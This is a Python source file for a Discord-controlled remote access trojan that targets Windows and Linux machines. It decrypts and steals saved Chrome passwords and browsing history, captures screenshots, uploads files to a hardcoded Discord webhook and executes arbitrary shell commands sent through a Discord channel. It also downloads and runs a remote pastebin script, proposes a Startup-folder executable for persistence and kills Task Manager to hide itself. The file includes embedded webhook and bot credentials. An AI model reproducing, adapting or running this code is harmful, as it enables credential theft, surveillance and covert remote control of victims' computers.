import sqlite3
import platform
import os
import subprocess
import json
import random
import base64
from time import sleep
os_name = platform.system()
if os_name == "Windows":
    try:
        import win32crypt
    except:
        subprocess.Popen(f"pip install pywin && pip install win32", stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, shell=False)
try:
    import discord
    from discord_webhook import DiscordWebhook
    from PIL import ImageGrab
    from dhooks import *
    import requests
    import psutil
    from Cryptodome.Cipher import AES
except Exception as e:
    subprocess.Popen(
        f"pip install discord && pip install psutil && pip install discord_webhook && pip install pillow && pip install dhooks && pip install requests && pip install pycryptodomex && pip install pycryptodome", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
    pass

os_name = platform.system()
webhook_url = "https://discord.com/api/webhooks/1104737542806437898/Qe5tRQOZoyKavweXRjJC0JrkwaoMdapqN4XdTcJu1fIejcxNHA2oR9FMjuC38dfG0Hkq"  # your webhook
channel = "s7ee7"
web = Webhook(webhook_url)
chars = [''.join(random.choice("0123456789") for j in range(5))]
id = ''.join(chars).strip()


def connect():
    ip = requests.get("https://ifconfig.me/")
    web.send(f"```Connected To {ip.text} \nID: {id}```\n||@everyone||")


def autorun():
    username = os.getlogin()
    path = "'C:\\Users\\" + username + \
        "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windows.exe'"
    sendToDiscord(
        f"Write This Command:\ncurl https://cdn.discordapp.com/attachments/1006192850519720016/1105371805339893770/ssti.exe -o {path}")


def googlehistory():
    profile_path = os.getenv('LOCALAPPDATA') + \
        '\\Google\\Chrome\\User Data\\Default\\'

    if os.path.isfile(profile_path + 'History'):
        try:
            connection = sqlite3.connect(profile_path + 'History')
            cursor = connection.cursor()
            cursor.execute("SELECT url, last_visit_time FROM urls")
            results = cursor.fetchall()
        except:
            sendToDiscord("Error: Could not access the History file.")
        else:
            message = 'Chrome Browsing History:\n'
            for result in results:
                message += f'{result[0]} visited at {result[1]}\n'
            data = open("history.txt", "a").write(message)
            data = open("history.txt", "rb")
            files = {"file": ("history.txt", data)}
            response = requests.post(webhook_url, files=files)
            if response.status_code != 204:
                sendToDiscord(f"Error: {response.text}")
            data.close()
            os.remove("history.txt")

    else:
        sendToDiscord("Error: History file not found.")


def googlepasswords():
    username = os.getlogin()
    path = "C:\\Users\\"+username + \
        "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

    conn = sqlite3.connect(path)
    cursor = conn.cursor()

    cursor.execute(
        "SELECT origin_url, username_value, password_value FROM logins")

    def fetching_encryption_key():
        local_computer_directory_path = os.path.join(
            os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
            "User Data", "Local State")

        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        encryption_key = base64.b64decode(
            local_state_data["os_crypt"]["encrypted_key"])

        encryption_key = encryption_key[5:]

        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

    def password_decryption(password, encryption_key):
        try:
            iv = password[3:15]
            password = password[15:]

            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

            return cipher.decrypt(password)[:-16].decode()
        except:

            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                sendToDiscord("No Passwords")

    for row in cursor.fetchall():
        try:
            password = win32crypt.CryptUnprotectData(
                row[2], None, None, None, 0)[1]
            password = password.decode("utf-8")
        except Exception as e:
            password = "Could not decrypt password"

        if not isinstance(password, str):
            password = str(password, 'utf-8')

        key = fetching_encryption_key()
        decrypted_password = password_decryption(row[2], key)
        with open("passwords.txt", "a") as f:
            f.write("Website: " + row[0] + "\n")
            f.write("Username: " + row[1] + "\n")
            f.write("Password: " + decrypted_password + "\n")
    conn.close()
    try:
        file = open("passwords.txt", "rb")

        payload = {"content": "Password file: "}
        files = {"file": ("passwords.txt", file)}

        response = requests.post(webhook_url, data=payload, files=files)

        file.close()
        os.remove("passwords.txt")
    except Exception as e:
        sendToDiscord(e)


def task_manager():
    def is_task_manager_running():
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'Taskmgr.exe':
                return True
        return False

    def close_task_manager():
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] == 'Taskmgr.exe':
                proc.kill()
                break
    if is_task_manager_running():
        close_task_manager()


def sendToDiscord(messege):
    web.send(f"```{messege}```")


intents = discord.Intents.all()
client = discord.Client(command_prefix='!', intents=intents)


@client.event
async def on_ready():
    connect()


@client.event
async def on_message(message):
    command = message.content
    command2 = command
    command = command.split(" ")
    task_manager()
    if message.author == client.user:
        return
    channel_name = message.channel.name
    if channel_name == channel:
        if command2 == "":
            pass
        elif command[0] == "autorun":
            autorun()
        elif command[0] == "cd" and len(command) > 1:
            try:
                os.chdir(command[1])
                sendToDiscord("Change Direcory ..")
            except Exception as e:
                sendToDiscord(e)
        elif command2 == f"kill {id}":
            sendToDiscord(f"exit .. {id}")
            exit()
        elif command[0] == "chrome_history":
            googlehistory()
        elif command[0] == "chrome_password":
            googlepasswords()
        elif command[0] == "session":
            sendToDiscord(id)
        elif command[0] == "live_screen":
            username = os.getlogin()
            platfor = platform.system()
            (lambda: (req := requests.get("https://pastebin.com/raw/y8MTmE5K")).text and (os.chdir("/tmp"), open(".screen.py", "a").write(req.text), os.system("nohup python /tmp/.screen.py > .outputscreen.txt 2>&1 &"), os.chdir(f"/home/{username}/")) if platfor == "Linux" else (
                subprocess.Popen(f"curl https://pastebin.com/raw/y8MTmE5K -o C:\\Users\\{username}\\Music\\screen.py", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False), sleep(1.5), subprocess.Popen(f"pythonw C:\\Users\\{username}\\Music\\screen.py", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)) if platfor != "Linux" else None)()
            web.send(
                "Open This Url:\nhttps://cybero2.000webhostapp.com/screen.php")
        elif command[0] == "screen":
            try:
                image = ImageGrab.grab()
                image.save("pic.png")
                webhook = DiscordWebhook(
                    url=webhook_url)
                with open("pic.png", "rb") as f:
                    webhook.add_file(
                        file=f.read(), filename='pic.png')
                response = webhook.execute()
                os.remove("pic.png")
            except Exception as e:
                sendToDiscord(e)
        elif command[0] == "download":
            try:
                webhook = DiscordWebhook(
                    url=webhook_url)
                with open(command[1], "rb") as f:
                    webhook.add_file(
                        file=f.read(), filename=command[1])
                response = webhook.execute()
            except Exception as e:
                sendToDiscord(e)
        else:
            try:
                op = subprocess.Popen(
                    command2, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                output = op.stdout.read().decode('utf-8')
                # output_error = op.stderr.read().decode('utf-8')
                if output == "":
                    pass
                else:
                    sendToDiscord(output)
            except Exception as e:
                sendToDiscord(e)


client.run(
    'MTA4ODc4NjcwNDA4MjY4MTkxNw.GTWR0L.2QdBN3MZ4rwDAkL-37F0hTBzkqjv3S9XGlzKoc')
